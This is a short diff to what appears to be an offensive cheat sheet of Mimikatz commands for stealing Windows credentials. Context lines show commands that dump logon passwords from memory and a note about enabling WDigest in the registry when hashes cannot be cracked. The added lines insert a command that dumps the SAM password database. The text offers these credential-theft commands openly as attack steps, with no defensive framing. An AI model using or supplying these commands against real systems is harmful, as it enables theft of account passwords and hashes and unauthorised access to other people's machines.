@@ -18,6 +18,10 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 
+Dump SAM
+```
+lsadump::sam
+```
 
 If password hash not crackable enable wdigest in registry
 ```
